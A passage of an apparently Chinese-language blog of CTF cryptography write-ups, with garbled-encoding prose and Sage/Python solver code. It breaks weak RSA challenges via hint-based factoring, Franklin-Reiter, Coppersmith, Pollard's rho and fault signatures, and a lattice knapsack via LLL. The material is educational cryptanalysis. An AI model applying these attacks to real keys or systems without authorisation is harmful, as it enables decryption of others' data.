class="line">#             if (pp ^ qq) % (2 ** l) == gift % (2 ** l) and pp*(qq * 2 ** 16 + q_) % (2 ** l) == N % (2 ** l):</span><br><span class="line">#                 find_p(&#x27;1&#x27; + p, &#x27;1&#x27; + q, q_)</span><br><span class="line">#                 find_p(&#x27;1&#x27; + p, &#x27;0&#x27; + q, q_)</span><br><span class="line">#                 find_p(&#x27;0&#x27; + p, &#x27;1&#x27; + q, q_)</span><br><span class="line">#                 find_p(&#x27;0&#x27; + p, &#x27;0&#x27; + q, q_)</span><br><span class="line"># for q_ in range(2 ** 16):</span><br><span class="line">#     find_p(&#x27;1&#x27;, &#x27;1&#x27;, q_)</span><br><span class="line"></span><br><span class="line"># while True:</span><br><span class="line">#     try:</span><br><span class="line">#         Q_h = (N &gt;&gt; (1024 - P_h.bit_length() * 2)) // P_h</span><br><span class="line">#         print(Q_h, Q_h.bit_length())</span><br><span class="line">#         Q_h = Q_h &gt;&gt; 6</span><br><span class="line">#         gifts = gift ^ (Q_h &lt;&lt; (512 - 16 - Q_h.bit_length()))</span><br><span class="line">#         P_h = gifts &gt;&gt; (512 - 16 - Q_h.bit_length())</span><br><span class="line">#         print(P_h, P_h.bit_length())</span><br><span class="line">#     except:</span><br><span class="line">#         break</span><br><span class="line"></span><br><span class="line"># for i in range(64):</span><br><span class="line">#     P = (P_h &lt;&lt; 6) + i</span><br><span class="line">#     if N % P == 0:</span><br><span class="line">#         print(P)</span><br><span class="line">#         break</span><br><span class="line"></span><br><span class="line">ph = bin(gift)[2:][:16] + &#x27;0&#x27;*(512-16)</span><br><span class="line">ph = int(ph,2)</span><br><span class="line">x = bin(gift)[2:][17:]</span><br><span class="line"> </span><br><span class="line">def fac(x,tp,tq):</span><br><span class="line">    if len(x) == 0:</span><br><span class="line">        return</span><br><span class="line">    if tp*tq&gt;N:</span><br><span class="line">        return </span><br><span class="line">    if N%(tp+1)==0:</span><br><span class="line">        print(tp+1)</span><br><span class="line">        return</span><br><span class="line">    </span><br><span class="line">    v = x[0]</span><br><span class="line">    r = x[1:]</span><br><span class="line">    l = len(r)</span><br><span class="line">    </span><br><span class="line">    if (tp+(1&lt;&lt;(l+1)))*(tq+(1&lt;&lt;(l+17)))&lt;N:</span><br><span class="line">        print(bin(tp)[:50])</span><br><span class="line">        print(bin(tq)[:50])</span><br><span class="line">        print(l)</span><br><span class="line">        return</span><br><span class="line">        </span><br><span class="line">        </span><br><span class="line">    if v == &#x27;0&#x27;:</span><br><span class="line">       fac(r, tp, tq)</span><br><span class="line">       fac(r, tp+(1&lt;&lt;l), tq+(1&lt;&lt;(l+16)))</span><br><span class="line">    else:</span><br><span class="line">       fac(r, tp+(1&lt;&lt;l), tq)</span><br><span class="line">       fac(r, tp, tq+(1&lt;&lt;(l+16)))</span><br><span class="line"> </span><br><span class="line">#qç¬¬1ä½ä¸º1 x[0]==&#x27;0&#x27;</span><br><span class="line">tq = 1&lt;&lt;511</span><br><span class="line">tp = ph + (1&lt;&lt;(512-16-1))</span><br><span class="line"> </span><br><span class="line">fac(x,tp,tq)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/Crypto-Write-Up-zh/image-20230802172550696.png" class="" title="image-20230802172550696">

<p>ä¹‹åæ¥åˆ° <code>flag == b&quot;dasctf&#123;&quot; + secret + b&quot;&#125;&quot;</code>è¿™ä¸€æ­¥ã€‚</p>
<p>å·²çŸ¥bytesè½¬longå‹ç›¸å½“äº256è¿›åˆ¶ï¼Œå‡è®¾secretçš„é•¿åº¦ä¸ºiï¼Œé‚£ä¹ˆã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">c2 = x ^ 11 </span><br><span class="line">c3 = (bytes_to_long(b&#x27;dasctf&#123;&#x27; + b&#x27;\00&#x27; * i + b&#x27;&#125;&#x27; ) * 256 ** (i + 1) + 256 * x) ^ 11</span><br><span class="line">(å…¶ä¸­x = secret , i = len(secret))</span><br></pre></td></tr></table></figure>

<h2 id="Franklin-Reiter-ç›¸å…³ä¿¡æ¯æ”»å‡»"><a href="#Franklin-Reiter-ç›¸å…³ä¿¡æ¯æ”»å‡»" class="headerlink" title="Franklin Reiter ç›¸å…³ä¿¡æ¯æ”»å‡»"></a>Franklin Reiter ç›¸å…³ä¿¡æ¯æ”»å‡»</h2><p>æŠŠ$n$å…ˆç¡®å®šä¸‹æ¥ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">P = 8006847171912577069085166877758626954304824756138758266557706391662987806065132448544117840031499707938227955094109779732609035310252723066470330862622641</span><br><span class="line">Q = N // P</span><br><span class="line">n = powmod(c1, int(invert(e, (P - 1) * (Q - 1))), N)</span><br><span class="line"># n = n + N</span><br><span class="line"># print(n)</span><br><span class="line">k = 0</span><br><span class="line">while True:</span><br><span class="line">    n = n + k * N</span><br><span class="line">    if n % 2 == 1:</span><br><span class="line">        print(n)</span><br><span class="line">        break</span><br><span class="line">    else:</span><br><span class="line">        k += 1</span><br></pre></td></tr></table></figure>

<p>ç›¸å…³ä¿¡æ¯æ”»å‡»ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># c2 = x ^ 11</span><br><span class="line"># c3 = (bytes_to_long(b&#x27;dasctf&#123;&#x27; + b&#x27;00&#x27; * i + b&#x27;&#125;&#x27;) * 256 ** (i + 1) + 256 * x) ^ 11</span><br><span class="line"># xä¸ºsecretï¼Œ i = len(secret)</span><br><span class="line"></span><br><span class="line">def GCD(a,b):</span><br><span class="line">    if b == 0:</span><br><span class="line">        return a.monic()</span><br><span class="line">    else:</span><br><span class="line">        return GCD(b,a % b)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">for i in range(50):</span><br><span class="line">    f1 = x ^ 11 - c2</span><br><span class="line">    f2 = (bytes_to_long(b&#x27;dasctf&#123;&#x27; + b&#x27;\x00&#x27; * i + b&#x27;&#125;&#x27;) + 256 * x) ^ 11 - c3</span><br><span class="line">    if GCD(f1,f2)[0] != 1:</span><br><span class="line">        secret = long_to_bytes(int(n - int(GCD(f1,f2)[0])))</span><br><span class="line">        flag = b&#x27;dasctf&#123;&#x27; + secret + b&#x27;&#125;&#x27;</span><br><span class="line">        print(flag)</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h1 id="å®æ³¢å¤©ä¸€æ¯-rsa"><a href="#å®æ³¢å¤©ä¸€æ¯-rsa" class="headerlink" title="[å®æ³¢å¤©ä¸€æ¯]rsa"></a>[å®æ³¢å¤©ä¸€æ¯]rsa</h1><ul>
<li>æ„é€ æ»¡è¶³æ¡ä»¶çš„$f$ï¼Œè¿›è¡Œæ ¹çš„æ±‚è§£</li>
<li>Pollard_rho ç®—æ³•</li>
<li>æ–¹ç¨‹åŒ–ç®€ï¼Œæ¨¡æ•°åˆ†è§£</li>
<li>Relating: ç¾ŠåŸæ¯2021-easy_rsa</li>
</ul>
<h2 id="æ³•1â€”â€”æ„é€ -f"><a href="#æ³•1â€”â€”æ„é€ -f" class="headerlink" title="æ³•1â€”â€”æ„é€ $f$"></a>æ³•1â€”â€”æ„é€ $f$</h2><blockquote>
<p>æ„é€ $f &#x3D; 2 \cdot g \cdot x + 1$ åœ¨æ¨¡$n$æƒ…å†µä¸‹æœ‰è§£ã€‚</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">R.&lt;x&gt; = Zmod(n)[]</span><br><span class="line">f = 2 * a * x + 1</span><br><span class="line">g = int(f.monic().small_roots(X=2^51, beta=0.4)[0])</span><br><span class="line">phi = (a - 1) * (g - 1)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br></pre></td></tr></table></figure>

<h2 id="æ³•2â€”â€”pollardâ€™s-rho"><a href="#æ³•2â€”â€”pollardâ€™s-rho" class="headerlink" title="æ³•2â€”â€”pollardâ€™s rho"></a>æ³•2â€”â€”pollardâ€™s rho</h2><blockquote>
<p>$p - 1$ä»¥åŠ$q - 1$å­˜åœ¨è¾ƒå¤§å…¬å› æ•°ï¼ŒPollardâ€™s rho åˆ†è§£n</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">f</span>(<span class="params">x, n</span>):</span><br><span class="line">    <span class="keyword">return</span> (<span class="built_in">pow</span>(x, n - <span class="number">1</span>, n) + <span class="number">3</span>) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">rho</span>(<span class="params">n</span>):</span><br><span class="line">    i = <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        a = getRandomRange(<span class="number">2</span>, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = <span class="number">1</span></span><br><span class="line">        <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">            p = GCD(<span class="built_in">abs</span>(a - b), n)</span><br><span class="line">            <span class="comment"># print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i))</span></span><br><span class="line">            <span class="keyword">if</span> p == n:</span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">            <span class="keyword">elif</span> p &gt; <span class="number">1</span>:</span><br><span class="line">                <span class="keyword">return</span> (p, n // p)</span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += <span class="number">1</span></span><br><span class="line">        i += <span class="number">1</span></span><br><span class="line"></span><br><span class="line">p, q = rho(n)</span><br><span class="line">d = invert(e, (p - <span class="number">1</span>)*(q - <span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<h2 id="æ³•3â€”â€”éé¢„æœŸ"><a href="#æ³•3â€”â€”éé¢„æœŸ" class="headerlink" title="æ³•3â€”â€”éé¢„æœŸ"></a>æ³•3â€”â€”éé¢„æœŸ</h2><blockquote>
<p>ç¥å¥‡éé¢„æœŸ</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">d = invert(e, a - <span class="number">1</span>)</span><br><span class="line">m = powmod(c, d, a)</span><br></pre></td></tr></table></figure>

<h2 id="æ³•4â€”â€”åŒ–ç®€è¿›è¡Œåˆ†è§£"><a href="#æ³•4â€”â€”åŒ–ç®€è¿›è¡Œåˆ†è§£" class="headerlink" title="æ³•4â€”â€”åŒ–ç®€è¿›è¡Œåˆ†è§£"></a>æ³•4â€”â€”åŒ–ç®€è¿›è¡Œåˆ†è§£</h2><blockquote>
<p>ç›´æ¥åˆ©ç”¨ç­‰å¼è¿›è¡Œåˆ†è§£ï¼ŒåŒ–ç®€å¯å¾—$p\cdot q - 1 &#x3D; 2gh$ï¼Œgä¸º51bitï¼Œhçº¦ä¸º972bitï¼Œä¸¤è€…ç›¸å·®éå¸¸å¤§ï¼Œåˆ©ç”¨factordb&#x2F;yafuè¿›è¡Œåˆ†è§£</p>
</blockquote>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">gh = (n - <span class="number">1</span>) // <span class="number">2</span></span><br><span class="line"><span class="comment"># print(gh)</span></span><br><span class="line">h = <span class="number">13570850594633462506426369052182298554140635599543685835372377476383038708650421475723391142118956001358520246769650699398490037618758005241062608387057439283872260149565854577827352267289963736282502923131251179400580891491236925451166755184695335564693793568286112036468975877609637392241679</span></span><br><span class="line">g = <span class="number">1346104232461691</span></span><br><span class="line">phi = (a - <span class="number">1</span>) * (g - <span class="number">1</span>)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br></pre></td></tr></table></figure>



<h2 id="æ€»exp"><a href="#æ€»exp" class="headerlink" title="æ€»exp"></a>æ€»exp</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># %%</span><br><span class="line">n = 36535558847082719901201561031181835346574576610950713924924272947759193576365817762980927638691696601293089537315055413746788190208875234794229119049056299551864869870291634941246362436491006904347559559494705922259007299126640817275929491680601926404543198957206717290905220235571289759182878331893962038379</span><br><span class="line">c = 532997872940452282189043430008002793694788439822465302532208754231005799057972378308576109082463996551992533174546386979606697890310597738637156771564229</span><br><span class="line">a = 2694858406312563434474553988904403597551484373358339092528913028454100111881368126493990657117571672510331411186745639563619323775673115439</span><br><span class="line">e = 65537</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># æ³•1</span><br><span class="line"># æ„é€ f = 2 * g * x + 1 åœ¨æ¨¡næƒ…å†µä¸‹æœ‰è§£</span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line"></span><br><span class="line">R.&lt;x&gt; = Zmod(n)[]</span><br><span class="line">f = 2 * a * x + 1</span><br><span class="line">g = int(f.monic().small_roots(X=2^51, beta=0.4)[0])</span><br><span class="line">phi = (a - 1) * (g - 1)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># æ³•2</span><br><span class="line"># Pollard&#x27;s rho åˆ†è§£n</span><br><span class="line">def f(x, n):</span><br><span class="line">    return (pow(x, n - 1, n) + 3) % n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">def rho(n):</span><br><span class="line">    i = 1</span><br><span class="line">    while True:</span><br><span class="line">        a = getRandomRange(2, n)</span><br><span class="line">        b = f(a, n)</span><br><span class="line">        j = 1</span><br><span class="line">        while True:</span><br><span class="line">            p = GCD(abs(a - b), n)</span><br><span class="line">            print(&#x27;&#123;&#125; in &#123;&#125; circle&#x27;.format(j, i))</span><br><span class="line">            if p == n:</span><br><span class="line">                break</span><br><span class="line">            elif p &gt; 1:</span><br><span class="line">                return (p, n // p)</span><br><span class="line">            else:</span><br><span class="line">                a = f(a, n)</span><br><span class="line">                b = f(f(b, n), n)</span><br><span class="line">            j += 1</span><br><span class="line">        i += 1</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># æ³•3</span><br><span class="line"># ç¥å¥‡éé¢„æœŸ</span><br><span class="line">d = invert(e, a - 1)</span><br><span class="line">m = powmod(c, d, a)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line"># æ³•4</span><br><span class="line"># ç›´æ¥åˆ©ç”¨ç­‰å¼è¿›è¡Œåˆ†è§£ï¼ŒåŒ–ç®€å¯å¾—p*q - 1 = 2ghï¼Œgä¸º51bitï¼Œhçº¦ä¸º972bitï¼Œä¸¤è€…ç›¸å·®éå¸¸å¤§ï¼Œåˆ©ç”¨factordb/yafuè¿›è¡Œåˆ†è§£</span><br><span class="line">gh = (n - 1) // 2</span><br><span class="line"># print(gh)</span><br><span class="line">h = 13570850594633462506426369052182298554140635599543685835372377476383038708650421475723391142118956001358520246769650699398490037618758005241062608387057439283872260149565854577827352267289963736282502923131251179400580891491236925451166755184695335564693793568286112036468975877609637392241679</span><br><span class="line">g = 1346104232461691</span><br><span class="line">phi = (a - 1) * (g - 1)</span><br><span class="line">n = a * g</span><br><span class="line">d = invert(e, phi)</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line">print(m)</span><br><span class="line">print(long_to_bytes(m))</span><br></pre></td></tr></table></figure>



<h1 id="CryptoCTF2021-HAMUL"><a href="#CryptoCTF2021-HAMUL" class="headerlink" title="[CryptoCTF2021]HAMUL"></a>[CryptoCTF2021]HAMUL</h1><ul>
<li>è§„çº¦ä½æ•°</li>
<li>çˆ†ç ´</li>
<li>Relating: HaM3å¤šä¸€å±‚çˆ†ç ´</li>
</ul>
<p><strong>å·²çŸ¥ä¿¡æ¯</strong></p>
<img src="/2023/03/09/Crypto-Write-Up-zh/image-20230706171746617.png" class="" title="image-20230706171746617">

<p><strong>æ¨å¯¼</strong><br>$$<br>P &#x3D; 10^{t}p + q<br>$$</p>
<p>$$<br>Q &#x3D; 10^{s}q + p<br>$$</p>
<p>$$<br>PP &#x3D; 10^{s + t}P + Q &#x3D; 10^{s + t}(10^{t}P + Q) + 10^{s}Q + P<br>$$</p>
<p>$$<br>QQ &#x3D; 10^{s + t}Q + P &#x3D; 10^{s + t}(10^{t}Q + P) + 10^{s}P + Q<br>$$</p>
<p>$$<br>N &#x3D; PP \cdot QQ &#x3D; 10^{3(t+s)}pq + \dots + pq<br>$$</p>
<p>$$<br>\Longrightarrow (10^{s + t}(10^{t}p + q) + 10^{s}q + p)(10^{t + s}(10^{s}q + p) + 10^{t}p + q)<br>$$</p>
<p>å¯¹$N$è¿›è¡Œæ•´é™¤å’Œæ±‚æ¨¡åˆ†æï¼Œä»è€Œå¾—åˆ°$pq$åè¿›åˆ¶çš„é«˜ä½å’Œä½ä½ã€‚</p>
<p>å¤§è‡´ç¡®å®š$p$ï¼Œ$q$çš„ä½æ•°è¿›è¡Œçˆ†ç ´ã€‚</p>
<p>ä»è€Œ$str(N)[:?] &lt;â€”&gt; str(pq)[:?]$</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">str(N)[:18] = str(pq)[:?]</span><br><span class="line">str(N)[-18:] = str(pq)[-18:]</span><br><span class="line">len(str(pq)) = 38</span><br><span class="line"></span><br><span class="line">-&gt; çˆ†ç ´ 2 digits</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># %%</span><br><span class="line">n = </span><br><span class="line">c = </span><br><span class="line"></span><br><span class="line">from Crypto.Util.number import *</span><br><span class="line">from gmpy2 import *</span><br><span class="line">from tqdm import tqdm</span><br><span class="line">low = str(n)[-18:]</span><br><span class="line">high = str(n)[:18]</span><br><span class="line">pq_prob = []</span><br><span class="line"></span><br><span class="line">for i in range(10):</span><br><span class="line">    for j in range(10):</span><br><span class="line">        pq_prob.append(int(high + str(i) + str(j) + low))</span><br><span class="line"># print(pq_prob)</span><br><span class="line"></span><br><span class="line">for pq in tqdm(pq_prob):</span><br><span class="line">    f = factor(pq)</span><br><span class="line">#     print(f)</span><br><span class="line">    if (len(f) == 2 and f[0][0].nbits() == 64):</span><br><span class="line">        p, q = f[0][0], f[1][0]</span><br><span class="line">        break</span><br><span class="line"></span><br><span class="line">P = int(str(p) + str(q))</span><br><span class="line">Q = int(str(q) + str(p))</span><br><span class="line">PP = int(str(P) + str(Q))</span><br><span class="line">QQ = int(str(Q) + str(P))</span><br><span class="line">assert n == PP*QQ</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"># %%</span><br><span class="line">d = invert(65537, (PP-1)*(QQ-1))</span><br><span class="line">m = powmod(c, d, n)</span><br><span class="line">print(long_to_bytes(m).decode())</span><br></pre></td></tr></table></figure>

<img src="/2023/03/09/Crypto-Write-Up-zh/1.png" class="" width="1">

<img src="/2023/03/09/Crypto-Write-Up-zh/2.png" class="" width="2">

<h1 id="DCIC2023-final-easybag"><a href="#DCIC2023-final-easybag" class="headerlink" title="[DCIC2023-final]easybag"></a>[DCIC2023-final]easybag</h1><ul>
<li>LLLè§„çº¦</li>
</ul>
<p>èƒŒåŒ…ï¼Œä½†æ˜¯æ¨¡æ¯”è¾ƒå°ï¼Œæ‰€ä»¥ç”¨å¸¸è§çš„é‚£å‡ ä¸ªæ ¼éƒ½æ‰“ä¸äº†ï¼Œå¯èƒ½çš„æ–¹æ³•æœ‰äºŒï¼šä¸€æ˜¯ç”¨babaiæ±‚è§£cvpï¼ŒäºŒæ˜¯æŠŠåŸæ¥çš„æ ¼å­å¤šåŠ ä¸€ç»´ï¼Œæ”¾ä¸ªæ¨¡æ•°è¿›å»è§„çº¦ï¼Œè¿™é‡Œç”¨çš„ç¬¬äºŒç§ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># æ„é€ æ ¼å­</span></span><br><span class="line">A = Matrix(ZZ, <span class="number">66</span>, <span class="number">66</span>)</span><br><span class="line"><span class="comment"># print(A)</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">64</span>):</span><br><span class="line">    A[i,i] = <span class="number">1</span></span><br><span class="line">    A[i,<span class="number">65</span>] = -pubkey[i]</span><br><span class="line">    </span><br><span class="line">A[<span class="number">64</span>,<span class="number">64</span>] = <span class="number">1</span></span><br><span class="line">A[<span class="number">64</span>,<span class="number">65</span>] = c</span><br><span class="line">A[<span class="number">65</span>,<span class="number">65</span>] = p</span><br><span class="line"><span class="comment"># print(A)</span></span><br><span class="line"><span class="built_in">print</span>(A.LLL()[<span class="number">0</span>])</span><br><span class="line"><span class="comment"># (0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0)</span></span><br></pre></td></tr></table></figure>

<p>LLLç®—æ³•è®¡ç®—å‡ºæ¥çš„é•¿åº¦ä¸º<code>66</code>ï¼Œå¼ºåˆ¶ä½¿ç”¨å›ºå®šé•¿åº¦ä¸º<code>64</code>çš„å‘é‡è¿›è¡Œè®¡ç®—ã€‚</p>
<p>æ‰€ä»¥æ¦‚æ‹¬ä¸€ä¸‹ï¼Œå…ˆå¤šåŠ ä¸€ç»´è¿›è¡Œè§„çº¦ï¼Œå†ä½¿ç”¨åŸæ¥å›ºå®šé•¿åº¦çš„å‘é‡ç»§ç»­è®¡ç®—ï¼Œä¿è¯ä¸€è‡´ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># k = (0, -1, 0, 0, 0, -1, 0, -1, -1, -1, 0, 0, 0, -1, -1, -1, 0, -1, -1, 0, 0, 0, 0, 0, 0, 0, 0, -1, 0, -1, 0, -1, -1, -1, 0, 0, 0, 0, 0, 0, -1, -1, 0, -1, 0, 0, -1, 0, 0, 0, -1, -1, -1, 0, 0, -1, -1, 0, 0, 0, -1, 0, -1, -1)</span></span><br><span class="line">k = A.LLL()[<span class="number">0</span>][<span class="number">0</span>:<span class="number">64</span>]</span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line">key = <span class="string">&#x27;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> k:</span><br><span class="line">    <span class="keyword">if</span> i:</span><br><span class="line">        key += <span class="string">&#x27;1&#x27;</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        key += <span class="string">&#x27;0&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">hex</span>(<span class="built_in">int</span>(key, <span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line">key = <span class="built_in">bytes</span>.fromhex(<span class="built_in">hex</span>(<span class="built_in">int</span>(key, <span class="number">2</span>))[<span class="number">2</span>:])</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">aes = AES.new(key = key*<span class="number">2</span>, mode=AES.MODE_ECB)</span><br><span class="line"><span class="built_in">print</span>(aes.decrypt(enc))</span><br><span class="line"><span class="comment"># 64</span></span><br><span class="line"><span class="comment"># 45c76015c0d2398b</span></span><br><span class="line"><span class="comment"># 8</span></span><br><span class="line"><span class="comment"># b&#x27;flag&#123;e42f0ab28e1c5fb04bbb0c797a2cd951&#125;\n\n\n\n\n\n\n\n\n\n&#x27;</span></span><br></pre></td></tr></table></figure>



<h1 id="DCIC2023-final-ddddhm"><a href="#DCIC2023-final-ddddhm" class="headerlink" title="[DCIC2023-final]ddddhm"></a>[DCIC2023-final]ddddhm</h1><ul>
<li>æ¡ä»¶åˆ¤æ–­å¾—åˆ°<code>part_d</code></li>
<li>Coppersmith-lowd</li>
</ul>
<h2 id="part-dçš„æ±‚è§£"><a href="#part-dçš„æ±‚è§£" class="headerlink" title="part_dçš„æ±‚è§£"></a>part_dçš„æ±‚è§£</h2><p>æœ¬é¢˜çš„å…³é”®åœ¨äº<code>fault_signature</code>å‡½æ•°ã€‚æ³¨æ„åˆ°åœ¨è¯¥å‡½æ•°ä¸­ï¼Œæ¯æ¬¡è¿›è¡ŒåŠ å¯†ä½¿ç”¨çš„$d$æ˜¯ç”±$d2$å˜åŒ–å¾—æ¥çš„ï¼Œä¸”æ¯æ¬¡ä»…å˜åŒ–1ä½ã€‚ç”±äº$d2$è‚¯å®šæ˜¯å¥‡æ•°ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡å˜æ¢æ—¶ï¼Œä½¿ç”¨çš„ç»“æœè‚¯å®šæ˜¯$d2-1$ï¼Œå³ï¼š</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg_fault_sigs[<span class="number">0</span>] = <span class="built_in">pow</span>(msg, d2 - <span class="number">1</span>, n)</span><br></pre></td></tr></table></figure>

<p>å‰©ä¸‹éƒ¨åˆ†ä¾æ—§æŒ‰ç…§è¯¥æ€è·¯è¿›è¡Œåˆ¤æ–­ï¼Œç”±äºå­˜åœ¨ä¸ç¡®å®šæ€§ï¼Œåˆ©ç”¨è®¡ç®—å‡º<code>msg_fault_sigs[0]</code>è¿›è¡Œè¾…åŠ©åˆ¤æ–­ï¼Œä»è€Œè®¡ç®—å‡º<code>part_d</code>ï¼š</p>
<p><em>å­—ç¬¦ä¸²è¿æ¥é¡ºåºéœ€è¦æ³¨æ„ï¼Œä»ä½ä½åˆ°é«˜ä½ã€‚</em></p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line">msg = bytes_to_long(<span class="string">b&#x27;ddddhm&#x27;</span>)</span><br><span class="line">pows = <span class="number">2</span></span><br><span class="line">part_d = <span class="string">&quot;1&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(msg_fault_sigs)):</span><br><span class="line">    <span class="comment"># here should pay attention to the string&#x27;s order</span></span><br><span class="line">    <span class="keyword">if</span>((msg_fault_sigs[i] * <span class="built_in">pow</span>(msg, pows-<span class="number">1</span>, n) - msg_fault_sigs[<span class="number">0</span>]) % n)==<span class="number">0</span>:</span><br><span class="line">        part_d = <span class="string">&quot;1&quot;</span> + part_d</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        part_d = <span class="string">&quot;0&quot;</span> + part_d</span><br><span class="line">    pows *= <span class="number">2</span></span><br><span class="line">part_d = <span class="built_in">int</span>(part_d, <span class="number">2</span>)</span><br><span class="line"><span class="built_in">print</span>(part_d.bit_length())</span><br><span class="line"><span class="built_in">print</span>(part_d)</span><br><span class="line"><span class="comment"># 681</span></span><br><span class="line"><span class="comment"># 9519637250511849605092115946924531911819643854022344770386391196998091816870433223070160919249620469852108874736739746738237759468821919367674447147826813269165414967606625427817526475380034928092527497223</span></span><br></pre></td></tr></table></figure>

<h2 id="coppersmithæ”»å‡»-å·²çŸ¥dä½ä½"><a href="#coppersmithæ”»å‡»-å·²çŸ¥dä½ä½" class="headerlink" title="coppersmithæ”»å‡»-å·²çŸ¥dä½ä½"></a>coppersmithæ”»å‡»-å·²çŸ¥dä½ä½</h2><p>ä½¿ç”¨é€šç”¨è„šæœ¬è®¡ç®—å¾—$p$ã€‚</p>
<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">partial_p</span>(<span class="params">p0, kbits, n</span>):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    nbits = n.nbits()</span><br><span class="line"></span><br><span class="line">    f = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    f = f.monic()</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span>^(nbits//<span class="number">2</span>-kbits), beta=<span class="number">0.3</span>)  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        x0 = roots[<span class="number">0</span>]</span><br><span class="line">        p = gcd(mpz(<span class="number">2</span>^kbits*x0 + p0), mpz(n))</span><br><span class="line">        <span class="keyword">return</span> ZZ(p)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">find_p</span>(<span class="params">d0, kbits, e, n</span>):</span><br><span class="line">    X = var(<span class="string">&#x27;X&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        results = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*n == X], <span class="number">2</span>^kbits)</span><br><span class="line">        <span class="keyword">for</span> x <span class="keyword">in</span> results:</span><br><span class="line">            p0 = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            p = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                <span class="keyword">return</span> p</span><br><span class="line"></span><br><span class="line">p = find_p(part_d, <span class="number">1024</span>-part_d.bit_length(), <span class="number">7</span>, n)</span><br><span class="line"><span class="comment"># 12800335172378590918875662486524333103691215133150369430200420149970735808370081784433007260276277361253378071964953226360740601994258142232798414547092861</span></span><br></pre></td></tr></table></figure>

<p>å·²çŸ¥$p$ä¹‹åé‚£å°±ç›´æ¥è½¬æ¢æˆåŸºç¡€RSAäº†ã€‚</p>
